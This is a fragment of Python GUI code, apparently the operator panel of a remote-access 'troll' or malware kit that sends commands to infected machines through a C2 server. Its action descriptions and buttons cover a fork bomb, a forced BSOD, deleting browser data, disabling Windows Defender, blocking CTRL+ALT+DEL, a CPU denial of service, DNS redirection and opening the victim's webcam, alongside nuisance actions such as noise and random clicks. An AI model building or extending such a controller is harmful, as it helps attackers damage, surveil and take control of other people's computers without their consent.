...
# The GUI needs its own list of toggleable states to manage the UI correctly.
...
class App(ctk.CTk):
    ...
    def _display_controls_for(self, command_str, button_name):
        ...
        # The key is the command_str, and the argument is the frame to build inside.
        if command_str in ui_builders: ui_builders[command_str](content_container)
        elif is_toggle: self._build_toggle_ui(content_container, button_name, command_str)
        else: self._build_default_ui(content_container, button_name, command_str)
    ...
    def _add_description_box(self, parent_frame, command_str):
        ...
        DESCRIPTIONS = {
            "show_popup": "Displays a native Windows message box. This action is blocking, meaning the user must interact with it.", "noise": "Toggles a continuous stream of annoying sounds.", "set_volume": "Sets the master system volume.", "usb_spam": "Continuously plays device connect/disconnect sounds.", "overlay": "Toggles a semi-transparent overlay covering the screen.", "clicking": "Toggles random mouse clicks.", "typing": "Toggles random keyboard typing.", "open_cd_tray": "Opens and closes the CD/DVD drive tray.", "app_spam": "Continuously opens random common applications.", "fake_shutdown": "Initiates a fake system shutdown which is then aborted.", "random_filenames": "Renames all files on the desktop to random strings.", "toggle_hide_icons": "Hides or shows all desktop icons.", "set_wallpaper": "Changes the desktop wallpaper to a local file.", "caps_lock": "Relentlessly forces Caps Lock on.", "open_website": "Forces the default browser to open a URL.", "toggle_wifi": "Enables or disables the Wi-Fi adapter.", "toggle_airplane_mode": "Toggles Airplane Mode (Admin needed).", "toggle_bluetooth": "Toggles Bluetooth (Admin needed).", "set_screen_orientation": "Rotates the primary display.", "focus_steal": "Continuously steals window focus.", "set_system_time": "Changes the system's clock (Admin needed).", "self_dos": "Consumes high CPU resources to slow the system.", "history_injector": "Adds URLs to browser history (Placeholder).", "set_taskbar_size": "Changes the size of taskbar icons.", "cursor_change": "Continuously changes the mouse cursor.", "dns_poison": "Redirects network traffic (Admin needed, Placeholder).", "printer_spam": "Spams a message to the default printer.", "streamer_cam": "Opens a window showing the webcam feed.", "fork_bomb": "Extremely destructive. Spawns processes to freeze the system.", "kill_tasks": "Terminates all non-critical user processes.", "bsod": "CRITICAL RISK. Triggers a Blue Screen of Death (Admin needed).", "shortkey_lock": "Disables system shortcuts like CTRL+ALT+DEL (Admin needed).", "user_change": "Logs the current user out (Placeholder).", "screen_reader": "Toggles Windows Narrator (Placeholder).", "safe_boot": "Forces a reboot into Safe Mode (Admin needed).", "browser_eraser": "HIGHLY DESTRUCTIVE. Deletes all user data from browsers.", "not_so_shortcut": "Disguises desktop files as shortcuts to a website.", "disable_defender": "Attempts to disable Windows Defender (Admin needed).", "taskbar_scramble": "Re-arranges pinned taskbar items (Placeholder)."
        }
    ...
    def _build_toggle_ui(self, parent_frame, name, command_base):
        ...
        start_btn = ctk.CTkButton(parent_frame, text="Start", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task(command_base, True)))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task(command_base, False)))
    ...
    def _build_noise_ui(self, parent_frame):
        ...
        noise_type = ctk.CTkOptionMenu(parent_frame, values=["Random", "Ear Splitting", "Knocking", "Custom"]); noise_type.pack(pady=10)
        path_entry = ctk.CTkEntry(parent_frame, placeholder_text="C:\\path\\to\\sound.wav", width=300); path_entry.pack(pady=5)
        def browse_file():
            filename = filedialog.askopenfilename(title="Select Sound File", filetypes=[("WAV files", "*.wav")])
        ...
        is_active = self.session_states.get(self.active_session_id, {}).get("noise", False)
        start_btn = ctk.CTkButton(parent_frame, text="Start Noise", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("noise", True, {"sound_type": noise_type.get().lower(), "path": path_entry.get()})))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop Noise", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("noise", False)))
        stop_btn.pack(pady=10)
        start_btn.configure(state="disabled" if is_active else "normal"); stop_btn.configure(state="normal" if is_active else "disabled")
    ...
    def _build_overlay_ui(self, parent_frame):
        ...
        overlay_type = ctk.CTkOptionMenu(parent_frame, values=["Color", "Custom Image", "Fake Crack"]); overlay_type.pack(pady=5)
        color_menu = ctk.CTkOptionMenu(parent_frame, values=["Black", "Red", "Blue", "Green", "White"]); color_menu.pack(pady=5)
        path_entry = ctk.CTkEntry(parent_frame, placeholder_text="C:\\path\\to\\image.jpg", width=300); path_entry.pack(pady=5)
        def browse_file():
            filename = filedialog.askopenfilename(title="Select Overlay Image", filetypes=[("Images", "*.jpg *.jpeg *.png")])
            if filename: path_entry.delete(0, "end"); path_entry.insert(0, filename)
        ctk.CTkButton(parent_frame, text="Browse...", command=browse_file).pack(pady=5)
        ...
        is_active = self.session_states.get(self.active_session_id, {}).get("overlay", False)
        args = {"overlay_type": overlay_type.get(), "alpha": alpha_slider.get(), "color": color_menu.get().lower(), "path": path_entry.get()}
        start_btn = ctk.CTkButton(parent_frame, text="Start Overlay", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("overlay", True, args))); start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop Overlay", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("overlay", False))); stop_btn.pack(pady=10)
        start_btn.configure(state="disabled" if is_active else "normal"); stop_btn.configure(state="normal" if is_active else "disabled")
    ...
    def _build_time_ui(self, parent_frame):
        ...
        t = datetime.now()
        y = ctk.CTkEntry(parent_frame, placeholder_text=f"Year ({t.year})"); y.pack(pady=2); y.insert(0, t.year)
        m = ctk.CTkEntry(parent_frame, placeholder_text=f"Month ({t.month})"); m.pack(pady=2); m.insert(0, t.month)
        d = ctk.CTkEntry(parent_frame, placeholder_text=f"Day ({t.day})"); d.pack(pady=2); d.insert(0, t.day)
        hr = ctk.CTkEntry(parent_frame, placeholder_text=f"Hour ({t.hour})"); hr.pack(pady=2); hr.insert(0, t.hour)
        minute = ctk.CTkEntry(parent_frame, placeholder_text=f"Minute ({t.minute})"); minute.pack(pady=2); minute.insert(0, t.minute)
    ...
    def _build_dos_ui(self, parent_frame):
        ...
        slider = ctk.CTkSlider(parent_frame, from_=1, to=10, number_of_steps=9, width=300, command=lambda v: label.configure(text=f"Power Level: {int(v)}")); slider.pack(pady=10); slider.set(5)
        is_active = self.session_states.get(self.active_session_id, {}).get("self_dos", False)
        start_btn = ctk.CTkButton(parent_frame, text="Start Attack", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("self_dos", True, {"power": slider.get()})))
        start_btn.pack(pady=10)
        stop_btn = ctk.CTkButton(parent_frame, text="Stop Attack", command=lambda: self._execute_action_with_cooldown(lambda: self._send_toggle_task("self_dos", False)))
        stop_btn.pack(pady=10)
        start_btn.configure(state="disabled" if is_active else "normal"); stop_btn.configure(state="normal" if is_active else "disabled")
    ...
    def _send_toggle_task(self, action, new_state, args={}):
        ...
        command = f"{command_prefix}_{action}"
    ...
    def _execute_action_with_cooldown(self, action_func):
        ...
        def re_enable():
            self.cooldown_active = False
            if active_button_info: self._display_controls_for(active_button_info[0], active_button_info[1])
    ...
    def update_gui_with_sessions(self, server_sessions):
        ...
        for session_data in server_sessions:
            ...
            if sid not in self.session_widgets:
                self.sessions[sid] = session_data; self.add_session_widget(session_data)
    ...
    def delete_session_handler(self, session_id):
        ...
        if messagebox.askyesno("Confirm Deletion", f"Permanently delete {hostname}?"):
            try: requests.post(f"{C2_SERVER_URL}/api/delete_session", json={"session_id": session_id}, timeout=10).raise_for_status()
